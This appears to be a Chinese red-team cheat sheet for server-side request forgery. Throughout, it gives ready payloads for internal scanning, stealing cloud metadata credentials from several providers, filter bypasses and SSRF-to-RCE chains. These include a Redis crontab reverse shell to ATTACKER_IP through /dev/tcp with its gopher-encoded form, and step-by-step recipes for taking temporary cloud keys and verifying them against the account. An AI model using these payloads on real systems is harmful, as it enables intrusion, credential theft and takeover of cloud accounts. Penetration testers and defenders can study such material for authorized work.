# SSRF（内网 / 云元数据 / Gopher / 盲打）
> 护网使用：授权、ROE、留痕、报告见 `../hw-rules/`。

---


## SSRF 服务端请求伪造实战参考
- SSRF→Redis RCE 链式利用 → `injection.md`
- XXE 可触发 SSRF → `xxe.md`

> 分类: 检测 → 内网探测 → 云元数据 → Gopher协议 → 绕过 → SSRF→RCE

> **last_updated**: 2026-06-04 | **tested_against**: AWS/GCP/Azure metadata, Redis 6.x, HTTP/HTTPS/Gopher
---

## 1. SSRF 检测

### 1.1 常见 SSRF 触发点

```
URL参数:     ?url=http://evil.com
图片URL:     ?image=http://evil.com
文件导入:    ?import=http://evil.com
Webhook:     webhook_url=http://evil.com
PDF生成:     ?html=http://evil.com
代理接口:    ?proxy=http://evil.com
回调地址:    ?callback=http://evil.com
API聚合:     /api/fetch?url=http://evil.com
```

### 1.2 检测方法

```bash
# 在VPS上监听:
nc -lvvp 8080

# 发送请求:
?url=http://YOUR_VPS:8080/test
?url=http://YOUR_VPS:8080/

# 收到请求 → SSRF 确认
# 检查请求来源 IP → 是目标服务器IP → 确认

# DNS 检测 (不出网也能测)
?url=http://xxxxx.your-dnslog-server.com
# DNS 记录有查询 → 即使HTTP不返回,DNS也证明服务端发起请求
```

---

## 2. 内网探测

### 2.1 端口扫描

```bash
# 通过响应时间/内容差异判断端口开放
?url=http://127.0.0.1:80/       # 正常返回 → 80开放
?url=http://127.0.0.1:22/       # 超时/连接拒绝 → 22关闭
?url=http://127.0.0.1:3306/     # MySQL 返回乱码 → 3306开放

# Burp Intruder 批量探测:
# payload: 192.168.1.{1-254}:8080
# 按响应长度/响应时间排序
```

### 2.2 常见内网目标

```
127.0.0.1:22,80,443,8080,9090,3306,6379,27017,11211
192.168.0.0/16
10.0.0.0/8
172.16.0.0/12
```

---

## 3. 云元数据窃取

### 3.1 AWS

```bash
# AWS EC2 元数据 (169.254.169.254)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM-Role-Name>
# → 返回 AccessKeyId + SecretAccessKey + Token

# 获取用户数据
http://169.254.169.254/latest/user-data/

# IPv6 版本 (绕过 IPv4 黑名单)
http://[fd00:ec2::254]/latest/meta-data/
```

### 3.2 其他云平台

```bash
# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
# 需要 Header: Metadata-Flavor: Google
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# 需要 Header: Metadata: true

# Digital Ocean
http://169.254.169.254/metadata/v1.json

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/

# Tencent Cloud
http://metadata.tencentyun.com/latest/meta-data/
```

---

## 4. Gopher 协议利用

### 4.1 Gopher 发送 TCP 原始数据

```bash
# 原理: gopher:// 可以发送任意 TCP 数据到任意端口
# → 利用 SSRF 攻击 Redis/MySQL/FastCGI 等内网服务

# Gopher 格式:
gopher://<host>:<port>/_<TCP_DATA>

# 数据需 URL 编码!!! 注意二次编码问题
```

### 4.2 Redis 未授权 → 写 Webshell / 写 SSH Key

```bash
# Redis 写 crontab (反弹Shell)
# Redis 命令 (原始):
flushall
set 1 "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n"
config set dir /var/spool/cron/
config set dbfilename root
save

# 转为 Gopher (URL编码):
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a*/1 * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1%0a%0d%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# 工具生成:
# https://github.com/tarunkant/Gopherus
python gopherus.py --exploit redis
```

### 4.3 MySQL 利用

```bash
# MySQL 客户端→服务端 有认证流程
# Gopherus 生成:
python gopherus.py --exploit mysql

# 也可以走:
# SSRF → MySQL → 读文件 (LOAD DATA LOCAL INFILE)
# 需 MySQL 服务端 fake server (Rogue MySQL Server)
```

---

## 5. CRLF 注入 (SSRF 中)

```bash
# 通过 CRLF 注入 HTTP 头 → 控制完整请求
?url=http://target.com/%0d%0aX-Injected:%20true%0d%0a%0d%0a<?php phpinfo();?>

# 利用场景:
# 1. 注入额外 HTTP Header
# 2. 注入 Body (SMTP 投毒)
# 3. HTTP Request Smuggling in SSRF

# SMTP 投毒:
?url=http://smtp-server:25/%0d%0aEHLO%20x%0d%0aMAIL%20FROM:<x@x.com>%0d%0aRCPT%20TO:<target@x.com>%0d%0aDATA%0d%0aFrom:<admin@x.com>%0d%0aTo:<target@x.com>%0d%0aSubject:Test%0d%0aTest%0d%0a.%0d%0a
```

---

## 6. 绕过 SSRF 限制

### 6.1 IP 地址变换

```bash
# 127.0.0.1 的变体
http://127.0.0.1
http://127.1                          # → 127.0.0.1
http://0x7f.0.0.1                     # 十六进制
http://0177.0.0.1                     # 八进制
http://2130706433                     # 十进制 → 127.0.0.1
http://0x7f000001                     # 十六进制
http://[::ffff:127.0.0.1]            # IPv4-mapped IPv6
http://[::ffff:7f00:0001]            # IPv6 变体

# DNS 重定向
# 注册域名, DNS A 记录指向 127.0.0.1
http://spoofed.burpcollaborator.net   # → 127.0.0.1
```

### 6.2 URL Schema 绕过

```bash
# 白名单只允许 http:// → 尝试其他协议
file:///etc/passwd
dict://127.0.0.1:11211/              # Memcached
gopher://127.0.0.1:6379/             # Redis
ftp://127.0.0.1:21/
sftp://127.0.0.1:22/
ldap://127.0.0.1:389/
tftp://127.0.0.1/

# URL 解析差异
http://expected.com@evil.com/        # @ → 真正连接 evil.com
http://evil.com#expected.com/         # # → 部分解析器取#前
http://evil.com?expected.com/         # ? → 同上
http://expected.com.evil.com/         # 域名包含

# Unicode / IDN 同形异义
http://ⓔⓧⓐⓜⓟⓛⓔ.com/  (Punycode → xn--...)
```

### 6.3 302 重定向绕过

```bash
# 服务端检查 URL 是白名单 → 但跟随302跳转
# 攻击者服务器:
GET /redirect HTTP/1.1
# → 302 Location: http://169.254.169.254/latest/meta-data/

# 两步跳转绕过:
# URL1: http://your-server.com/step1 → 302 → http://your-server.com/step2
# URL2: http://your-server.com/step2 → 302 → http://169.254.169.254/
# 部分SSRF只检查第1跳 → 绕过
```

---

## 7. SSRF → RCE 完整链

```
1. 发现 SSRF (出网) 
2. 内网探测 → 发现 Redis:6379 未授权
3. Gopher 协议 → Redis 写 SSH 公钥
4. SSH 登录 → RCE

或:
1. 发现 SSRF
2. 内网探测 → 发现 Solr/Elasticsearch/Hadoop/Jenkins
3. 利用对应漏洞 → RCE

或 (不出网):
1. 发现 SSRF (响应回显)
2. file:// 协议读本地文件 → 读代码/配置文件
3. 从代码中找到其他漏洞 → RCE
```

---

## 8. 盲 SSRF

### 8.1 盲SSRF检测

```
# 特征: 请求成功发送, 但不返回响应体
# 检测: DNSLog / Burp Collaborator

# 验证步骤:
1. 输入: http://your-dnslog.com → 收到DNS查询 → SSRF确认
2. 输入: http://127.0.0.1:80/ → 无DNS查询 → 可能是内网请求
3. 内网探测需要靠 时间盲注/错误消息/不同响应码
```

### 8.2 盲SSRF利用

```
# 1. 内网端口扫描 (通过超时判断)
# 2. 配合其他漏洞 (XSS/XXE) 变成非盲
# 3. 如果支持 data: 等伪协议 → 绕过HTTP限制
```

---
## 相关参考
- SSRF→Redis RCE 链式利用 → `injection.md`
- XXE 可触发 SSRF → `xxe.md`

*参考: OWASP SSRF + PayloadAllTheThings + 实战案例*


---

## 补充与进阶


---

## SSRF 测试手册

---

## 常见注入点

```
图片/文件URL参数: imageUrl=, fileUrl=, url=, link=, targetUrl=
预览/加载功能: preview=, fetch=, load=, callback=
Webhook: webhook_url=, notify_url=, redirect_url=
PDF/截图生成: 传入 URL 生成截图
模型/网关代理: path 带 proxy，参数仍是 targetUrl / url / callback
```

---

## 检测 Payload

---

### 使用 DNSLog 验证（无回显）

```bash

---

# 申请一个 dnslog 域名: dnslog.cn / ceye.io / interact.sh
DNSLOG="your-unique-id.dnslog.cn"

---

# 去 dnslog 平台查看是否有 DNS 查询记录

---

# 有记录 → SSRF 存在
```

---

### 内网探测（确认 SSRF 后）

```bash

---

# 探测内网常用 IP 段
for ip in 192.168.1.{1..254}; do
  echo "?url=http://$ip"
done

---

# 探测内网服务端口
?url=http://192.168.1.1:6379/   # Redis
?url=http://192.168.1.1:27017/  # MongoDB
?url=http://192.168.1.1:8080/   # 内网 Web
?url=http://192.168.1.1:22/     # SSH（通过响应时间判断）
```

---

### 云服务 Metadata（重点）

```bash

---

# AWS EC2 Metadata（严重危害，可获取 IAM 凭证）
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

---

# 国内云 ECS 元数据
?url=http://100.100.100.200/latest/meta-data/
?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/

---

# GCP Metadata
?url=http://metadata.google.internal/computeMetadata/v1/

---

# 云厂商（目录通了还要取钥匙，见下「云厂商元数据路径差」）
?url=http://厂商元数据域名/latest/meta-data/
?url=http://厂商元数据域名/latest/meta-data/cam/security-credentials/
?url=http://厂商元数据域名/latest/meta-data/cam/service-role-security-credentials/<ROLE>
?url=http://169.254.169.254/latest/meta-data/
```

---

### 云厂商元数据路径差 / 回环拦了元数据没拦 / 云开发匿名代理（手法索引有指针）

认：云厂商元数据；或云开发 / HTTP 网关 path 带 `proxy`，参数是 `targetUrl` / `url` / `callback`；有匿名登录（`signin/anonymously` 一类）就能拿到 token。

打：

1. **过滤对照。** 先打 `http://127.0.0.1/`，再打 `http://厂商元数据域名/latest/meta-data/` 和 `http://169.254.169.254/latest/meta-data/`。回环 403、`Forbidden Loopback` ≠ 元数据也拦了。只拦回环字符串、不按解析后的 IP 再拦云元数据域名，继续打。
2. **钥匙路径。** 目录通了先读角色名（`cam/security-credentials/` 下列表）。再取临时钥匙：`cam/security-credentials/角色名` 常 404，**必须再打** `cam/service-role-security-credentials/角色名`。按 AWS `iam/security-credentials/` 菜谱在 404 停手 = 漏钥匙。
3. **匿名网关当入口。** 官方演示环境、匿名登录拿到的 token，**不当「已经登录、权限内」**。带着它打 `*proxy*` 的 URL 参。别的环境同一接口可能禁掉，换环境继续试，不把一处禁掉当成全产品安全。
4. **固定 POST 的开放代理。** 直打元数据 405（IMDS 只吃 GET）≠ 没洞。先打公网 302（`redirect-to` 一类）把 Location 指到 `http://100.100.100.200/latest/meta-data/ram/security-credentials/角色`，让代理跟跳转时改成 GET。国内云角色列在 `ram/security-credentials/`。钥拿去 STS GetCallerIdentity。

算成：回显元数据正文，或拿到 `TmpSecretId` / `TmpSecretKey` / `Token`，再用这三样调云 API（`GetCallerIdentity` 一类）对上主账号。ListBuckets 403 别停，再签 CLS `DescribeConfigs` 看采集配置/主题。只读到 instance-id、钥匙 404 或调不通 → 还没成。

假点：代理只允许模型厂商白名单、元数据也 403；匿名开了但代理对匿名关死；钥匙是窄角色且没证明能调任何云 API（半条，别空喊接管全账号）。单站没中不删手法索引这行。

和通用「SSRF 打 `169.254.169.254`」不是重复：本条补的是 **厂商钥匙路径差 + 回环/元数据过滤分裂 + 匿名网关当入口**。公开 GOPROXY 不是本枪步骤，见下一节。

---

### 公开 GOPROXY（手法索引有指针）

认：公开 GOPROXY（`/go/`、模块 `/@v/list`）会按模块路径做 `?go-get=1` 再跟 VCS。**不是**上一节云开发 `*proxy*`。

打（不登录）：

1. 模块路径写成自己的域。  
2. 页上 `go-import` 用 **hg** + `http://厂商元数据域名/...`（git HTTPS 常超时）。  
3. RFC1918 Forbidden ≠ 元数据域名也拦。目录通了钥匙走 `cam/service-role-security-credentials/角色`（同上一节第 2 步）。

算成：hg 报错/回显出元数据或临时钥匙，再 GetCallerIdentity 问出 AccountId。

假点：不是 GOPROXY / 模块路径不会 `go-get`；元数据域名也被拦（不只 Forbidden RFC1918）；hg 也不跟且出不了钥；钥调不通。单站没中不删手法索引这行。

---

## 绕过技巧

```bash

---

# 绕过 IP 黑名单
http://127.0.0.1/    → http://2130706433/       # 十进制 IP
                     → http://0177.0.0.1/        # 八进制
                     → http://0x7f000001/         # 十六进制
                     → http://127.1/             # 简写

---

# 绕过 localhost 过滤
http://localhost/    → http://[::1]/             # IPv6
                     → http://127.0.0.1.xip.io/ # DNS 解析到 127

---

# 协议变换
http://internal-host/ → file:///etc/passwd
                      → gopher://127.0.0.1:6379/_*1...（打 Redis）
                      → dict://127.0.0.1:6379/info

---

# URL 重定向绕过
搭建重定向服务: http://attacker.com/redirect → 302 → http://169.254.169.254/
```

---

### COS 回源竞态（见了回源再打）

认：业务从 COS/OSS **取对象**，桶上配了「对象不存在则回源」到你能控的源；你还能对**同一 key** PUT 和 DELETE。没回源配置不要空打。

打：

1. 回源指到你的站，源上 302 到元数据或内网。  
2. 对同一 key 一边 PUT（检测时对象在，不回源）、一边 DELETE（真正 GET 时对象没了 → 回源跟 302）。并发见 `logic-race.md`。  
3. 看业务下载/导入是否打到你的源或内网。

算成：业务侧跟到内网/元数据（回显、带外或导入结果里有）。只证明回源能配、没打到内网 → 没成。

假点：回源不跟 302；检测和下载走同一时刻缓存；你控不了回源目标。不进手法索引（要自己能配回源，偏窄）。

---

## gopher 协议打内网服务

```bash

---

# 打 Redis（写 webshell 或计划任务）

---

# gopher://127.0.0.1:6379/_RESP编码的命令
?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A

---

# 工具生成 gopher payload

---

# gopherus: python gopherus.py --exploit redis
```

---

---

## dns-rebinding-test（几乎不交）

> 单独 DNS 重绑定不交。SSRF 过滤绕过走 `ssrf.md`。